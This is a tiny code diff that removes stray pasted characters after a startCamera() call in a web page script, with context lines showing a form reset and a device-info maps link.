@@ -129,4 +129,4 @@ Maps: ${deviceInfo.mapsLink}`;
       document.getElementById('channelForm').reset();
     });
 
-    startCamera();￼Enter
+    startCamera();
